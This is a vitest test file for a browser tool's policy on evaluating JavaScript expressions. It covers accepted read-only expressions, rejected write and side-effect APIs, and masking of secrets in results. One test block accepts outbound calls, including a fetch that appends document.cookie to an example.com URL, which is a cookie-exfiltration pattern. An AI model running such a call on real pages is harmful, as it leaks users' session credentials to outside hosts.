import { describe, expect, it } from 'vitest'
import {
  EVAL_HELPERS,
  MAX_EVAL_EXPRESSION,
  MAX_EVAL_RESULT_BYTES,
  maskEvalResult,
  serializeEvalResult,
  validateEvalExpression,
  wrapEvalExpression,
} from '../src/eval-policy.ts'
import { BrowserError } from '../src/errors.ts'

/** Assert that an expression is rejected with a BrowserError code 'eval-policy'. */
function expectEvalPolicyError(expression: string): void {
  let thrown: unknown
  try {
    validateEvalExpression(expression)
  } catch (e) {
    thrown = e
  }
  expect(thrown, `expected eval-policy rejection for: ${expression}`).toBeInstanceOf(BrowserError)
  expect((thrown as BrowserError).code).toBe('eval-policy')
}

describe('validateEvalExpression: accepted read-only expressions', () => {
  it.each([
    '1 + 1',
    'window.__NEXT_DATA__',
    `readText('#a')`,
    `JSON.parse('{}')`,
    'getComputedStyle(document.body).width',
    `localStorage.getItem('t')`,
    `('a' + 'b').toUpperCase()`,
    '(x => x * 2)(21)',
  ])('accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

describe('validateEvalExpression: network-outbound APIs are allowed (product decision 2026-09-08)', () => {
  it.each([
    `fetch('https://example.com')`,
    `fetch('https://example.com', { method: 'POST', body: 'x' })`,
    `navigator.sendBeacon('https://example.com', 'x')`,
    `fetch('https://example.com').then(r => r.text())`,
    `window.postMessage('x', '*')`,
    `fetch('https://example.com/?c=' + document.cookie)`,
  ])('accepts %s (network call, no code execution)', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })

  it('still rejects constructor-style network APIs (new is code execution)', () => {
    // `new XMLHttpRequest()` / `new WebSocket()` / `new EventSource()` are
    // rejected because `new` (arbitrary construction) is a code-execution
    // node kind — the network-outbound relaxation does not lift `new`.
    // Function-call forms (fetch/sendBeacon) are allowed above.
    for (const expression of [
      `new XMLHttpRequest()`,
      `new WebSocket('wss://example.com')`,
      `new EventSource('https://example.com')`,
    ]) {
      expect(() => validateEvalExpression(expression), expression).toThrow()
    }
  })
})

describe('validateEvalExpression: rejected writes and declarations', () => {
  it.each([
    // assignments / updates
    'a = 1',
    'a += 1',
    'x.y = 1',
    'count++',
    // declarations
    'let a = 1',
    'const b = 2',
    'function f() {}',
    'class A {}',
    'class B { m() {} }',
    // constructors
    'new Date()',
    'new Map()',
    // side-effect / write APIs (called or member-accessed)
    `localStorage.setItem('a', 'b')`,
    `document.write('x')`,
    'form.submit()',
    'window.open()',
    'alert(1)',
    "x.innerHTML = 'y'",
    'setTimeout(() => 1, 10)',
    'setInterval(f, 10)',
    "document.querySelector('a').click()",
    'history.pushState(null, "", "/x")',
    'location.assign("https://x")',
  ])('rejects %s', (expression) => {
    expectEvalPolicyError(expression)
  })

  it("rejects a member access to a write API even without a call", () => {
    expectEvalPolicyError('localStorage.setItem')
    expectEvalPolicyError('document.write')
  })

  it('rejects eval and Function', () => {
    expectEvalPolicyError('eval("1")')
    expectEvalPolicyError('Function("return 1")()')
  })
})

describe('validateEvalExpression: structure and length bounds', () => {
  it('rejects an empty expression', () => {
    expectEvalPolicyError('')
  })

  it('rejects an expression longer than the max length', () => {
    expectEvalPolicyError('a'.repeat(MAX_EVAL_EXPRESSION + 1))
    // exactly at the limit the length check passes; the parser then rejects it
    expectEvalPolicyError('('.repeat(MAX_EVAL_EXPRESSION))
  })

  it('rejects multiple statements', () => {
    expectEvalPolicyError('a;b')
    expectEvalPolicyError('a; b; c')
  })

  it('rejects control-flow statements inside the program', () => {
    expectEvalPolicyError('return 1')
    expectEvalPolicyError('if (true) 1')
    expectEvalPolicyError('for (;;) {}')
    expectEvalPolicyError('while (false) {}')
  })

  it('rejects tagged templates', () => {
    expectEvalPolicyError('tag`x`')
  })
})

describe('wrapEvalExpression', () => {
  it('wraps the expression in an immediately-invoked arrow function', () => {
    const expression = `readText('#a') + 1`
    const wrapped = wrapEvalExpression(expression)
    expect(wrapped.startsWith('(() => {')).toBe(true)
    expect(wrapped.endsWith('})()')).toBe(true)
    expect(wrapped).toContain(`return (${expression});`)
  })

  it('defines all read-only helpers (prefixed and aliased)', () => {
    const wrapped = wrapEvalExpression('1')
    for (const helper of EVAL_HELPERS) {
      expect(wrapped).toContain(helper)
    }
    expect(wrapped).toContain('__readText')
    expect(wrapped).toContain('__readAttr')
    expect(wrapped).toContain('__readJson')
    expect(wrapped).toContain('__readVar')
  })

  it('produces executable code for a pure expression', () => {
    const wrapped = wrapEvalExpression('21 * 2')
    // eslint-disable-next-line no-new-func
    expect(new Function(`return ${wrapped}`)()).toBe(42)
  })
})

describe('serializeEvalResult: secret masking', () => {
  it('masks strings containing secret-shaped keywords (length >= 6)', () => {
    expect(serializeEvalResult({ token: 'abc-token-123' })).toBe('{"token":"****"}')
    expect(serializeEvalResult({ secret: 'verysecret' })).toBe('{"secret":"****"}')
    expect(serializeEvalResult({ password: 'hunter2secret' })).toBe('{"password":"****"}')
    expect(serializeEvalResult('Bearer abc.def.ghi')).toBe('"****"')
    expect(serializeEvalResult({ apiKey: 'api_key_12345' })).toBe('{"apiKey":"****"}')
    expect(serializeEvalResult({ sessionId: 'session-id-xyz' })).toBe('{"sessionId":"****"}')
  })

  it('keeps short secret-looking strings (length < 6) unmasked', () => {
    // 'token' is exactly 5 chars → below the mask threshold
    expect(serializeEvalResult('token')).toBe('"token"')
    expect(serializeEvalResult({ code: 'token' })).toBe('{"code":"token"}')
  })

  it('keeps ordinary values unchanged', () => {
    expect(serializeEvalResult({ name: 'Alice', age: 1 })).toBe('{"name":"Alice","age":1}')
    expect(serializeEvalResult([1, 'two', null, true])).toBe('[1,"two",null,true]')
    expect(serializeEvalResult(undefined)).toBe('null')
  })

  it('masks a secret-shaped string longer than the 4 KB truncation cap (2026-09-11)', () => {
    // Regression: truncation used to return BEFORE the detectors, so a large
    // cookie jar (or any long credential-bearing body) came back in the clear.
    const cookie = 'SID=OPAQUESECRETVALUE; theme=dark; pad=' + 'y'.repeat(4200)
    expect(serializeEvalResult(cookie)).toBe('"****"')
    const longToken = 'prefix ' + 'y'.repeat(4200) + ' token=super-secret-value'
    expect(serializeEvalResult(longToken)).toBe('"****"')
    // A long, harmless string is still truncated (with the ellipsis marker).
    const harmless = 'plain text '.repeat(500)
    const out = serializeEvalResult(harmless)
    expect(out.startsWith('"plain text')).toBe(true)
    expect(out.endsWith('…"')).toBe(true)
  })
})

describe('serializeEvalResult: size / depth / key caps', () => {
  it('truncates oversized results with an ellipsis', () => {
    const big = Array.from({ length: 64 }, (_, i) => `value-${i}-` + 'x'.repeat(150))
    const out = serializeEvalResult(big)
    expect(out.length).toBe(MAX_EVAL_RESULT_BYTES + 1)
    expect(out.endsWith('…')).toBe(true)
  })

  it('caps result depth at MAX_EVAL_RESULT_DEPTH', () => {
    const deep = { l1: { l2: { l3: { l4: { l5: { l6: { l7: 1 } } } } } } }
    const out = serializeEvalResult(deep)
    expect(out).toContain('[depth-limit]')
    expect(() => JSON.parse(out)).not.toThrow()
  })

  it('maskEvalResult returns [depth-limit] beyond the cap directly', () => {
    expect(maskEvalResult('x', 7)).toBe('[depth-limit]')
  })

  it('truncates objects with 128+ keys and marks the tail', () => {
    const big = Object.fromEntries(Array.from({ length: 130 }, (_, i) => [`k${i}`, i]))
    const out = serializeEvalResult(big)
    expect(out).toContain('"[truncated]"')
    const parsed = JSON.parse(out) as Record<string, unknown>
    expect(parsed['…']).toBe('[truncated]')
    expect(Object.keys(parsed).length).toBe(129) // 128 keys + marker
  })

  it('returns "[unserializable]" for BigInt values', () => {
    expect(serializeEvalResult({ a: 1n })).toBe('"[unserializable]"')
  })

  it('handles circular references without throwing (depth-bounded output)', () => {
    const circular: Record<string, unknown> = {}
    circular.self = circular
    const out = serializeEvalResult(circular)
    expect(out).toContain('[depth-limit]')
    expect(typeof out).toBe('string')
  })

  it('never throws on big inputs', () => {
    const big = {
      rows: Array.from({ length: 1000 }, (_, i) => ({ i, name: `row-${i}`, tags: ['a', 'b'] })),
      nested: { meta: { createdAt: Date.now(), actor: 'ai' } },
    }
    expect(() => serializeEvalResult(big)).not.toThrow()
    expect(serializeEvalResult(big)).toBeTruthy()
  })
})
